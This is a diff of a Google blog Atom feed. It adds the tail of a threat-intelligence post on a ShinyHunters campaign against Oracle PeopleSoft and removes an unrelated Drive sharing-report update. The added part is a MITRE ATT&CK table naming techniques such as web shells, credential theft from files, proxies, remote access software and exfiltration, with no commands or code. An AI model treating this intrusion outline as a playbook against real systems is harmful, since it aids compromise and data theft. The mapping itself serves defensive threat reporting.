+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;T1505.003 Server Software Component: Web Shell&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Discovery&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;T1082 System Information Discovery&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Discovery&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;T1016 System Network Configuration Discovery&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Credential Access&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;T1552.001 Unsecured Credentials: Credentials In Files&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Command and Control&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;T1090 Proxy&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Command and Control&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;T1219 Remote Access Software&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Exfiltration&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;T1048 Exfiltration Over Alternative Protocol&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="vertical-align: baseline; color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;Table 3: MITRE ATT&amp;amp;CK&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;</content>
+    <link href="https://cloud.google.com/blog/topics/threat-intelligence/shinyhunters-renewed-mass-exploitation-campaign-targeting-oracle-peoplesoft" rel="alternate"/>
+    <category term="Google Cloud"/>
+    <published>2026-09-25T14:00:00+00:00</published>
+    <media:group>
+      <media:content url="https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_3_PSEMHUB_WAF_bypass.max-1000x1000.png" type="image/png" medium="image"/>
+      <media:thumbnail url="https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_3_PSEMHUB_WAF_bypass.max-1000x1000.png"/>
+    </media:group>
+    <link rel="enclosure" href="https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_3_PSEMHUB_WAF_bypass.max-1000x1000.png" type="image/png" length="0"/>
   </entry>
   <entry>
     <id>https://docs.cloud.google.com/release-notes#September_25_2026</id>
@@ -28347,14 +28946,5 @@ Flow attributed as the flow’s name with owner’s information&lt;/td&gt;&lt;/t
       <media:thumbnail url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjD8DvRFOHPQRHJxNb8_rHQzuoX7zuvaprwvBzUf21P2O9DlTquknxIcuB2QcSpDIcWyGmEpK_WvprrselFma1K4C0rTRAIUT8eNMZW3cgRdwAIfCQmPri2axH37QvbB1-HpSWFP1tCV7cc-shOh8L8ltdRing-bbrvTtUN21rU_fXRCUZr874A5d2_hqs/s72-w640-h565-c/Cross-user%20collaboration%20with%20Studio.png"/>
     </media:group>
     <link rel="enclosure" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjD8DvRFOHPQRHJxNb8_rHQzuoX7zuvaprwvBzUf21P2O9DlTquknxIcuB2QcSpDIcWyGmEpK_WvprrselFma1K4C0rTRAIUT8eNMZW3cgRdwAIfCQmPri2axH37QvbB1-HpSWFP1tCV7cc-shOh8L8ltdRing-bbrvTtUN21rU_fXRCUZr874A5d2_hqs/s72-w640-h565-c/Cross-user%20collaboration%20with%20Studio.png" type="image/png" length="0"/>
-  </entry>
-  <entry>
-    <id>https://workspaceupdates.googleblog.com/2026/08/enhanced-external-sharing-insights-now-available-in-Drive-Inventory-Reporting.html</id>
-    <title>Enhanced external sharing insights now available in Drive Inventory Reporting</title>
-    <updated>2026-08-17T17:34:55+00:00</updated>
-    <content type="html">&lt;p&gt;Administrators using Drive Inventory Reporting in Google BigQuery can now access granular external sharing fields designed to simplify complex permission structures. By automatically consolidating direct permissions, group memberships, and public links into clear signals, this update helps organizations easily identify external exposure across their Drive environments.&lt;/p&gt;&lt;p&gt;Administrators can now distinguish between human users, service accounts, and files published to the web, as well as cross-reference sharing attributes with existing Data Loss Prevention (DLP) metadata to prioritize remediation for high-risk data.&lt;/p&gt;&lt;h3 style="text-align: left;"&gt;Getting started&lt;/h3&gt;&lt;p&gt;&lt;/p&gt;&lt;ul style="text-align: left;"&gt;&lt;li&gt;&lt;b&gt;Admins: &lt;/b&gt;This feature will be OFF by default and can be enabled via the "External sharing calculations" setting under Drive inventory report settings in the Google Admin console. Note that for organizations with large Google groups, enabling this calculation may extend processing time and impact report delivery schedules.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;h3 style="text-align: left;"&gt;Rollout pace&lt;/h3&gt;&lt;p&gt;&lt;/p&gt;&lt;ul style="text-align: left;"&gt;&lt;li&gt;&lt;a href="https://support.google.com/a/answer/172177" target="_blank"&gt;Rapid Release and Scheduled Release domains:&lt;/a&gt; Gradual rollout (up to 15 days for feature visibility) starting on August 14, 2026&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;h3 style="text-align: left;"&gt;Availability&lt;/h3&gt;&lt;p&gt;&lt;/p&gt;&lt;ul style="text-align: left;"&gt;&lt;li&gt;&lt;b&gt;Enterprise:&lt;/b&gt; Enterprise Standard, and Plus&lt;/li&gt;&lt;li&gt;&lt;b&gt;Education: &lt;/b&gt;Education Standard, and Plus&lt;/li&gt;&lt;li&gt;&lt;b&gt;Other Editions:&lt;/b&gt; Frontline Plus; Enterprise Essentials Plus; Cloud Identity Premium&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;h3 style="text-align: left;"&gt;Resources&lt;/h3&gt;&lt;p&gt;&lt;/p&gt;&lt;ul style="text-align: left;"&gt;&lt;li&gt;Google Workspace Admin Help: &lt;a href="https://knowledge.workspace.google.com/admin/reports/export-your-organizations-drive-inventory" target="_blank"&gt;Export your organization’s Drive inventory&lt;/a&gt;&lt;/li&gt;&lt;li&gt;Google Workspace Admin Help: &lt;a href="https://knowledge.workspace.google.com/admin/reports/schema-and-example-queries-for-drive-inventory-exports-in-bigquery" target="_blank"&gt;Schema and example queries for Drive inventory exports in BigQuery&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;</content>
-    <link href="https://workspaceupdates.googleblog.com/2026/08/enhanced-external-sharing-insights-now-available-in-Drive-Inventory-Reporting.html" rel="alternate"/>
-    <category term="Workspace Updates"/>
-    <published>2026-08-17T17:34:55+00:00</published>
   </entry>
 </feed>
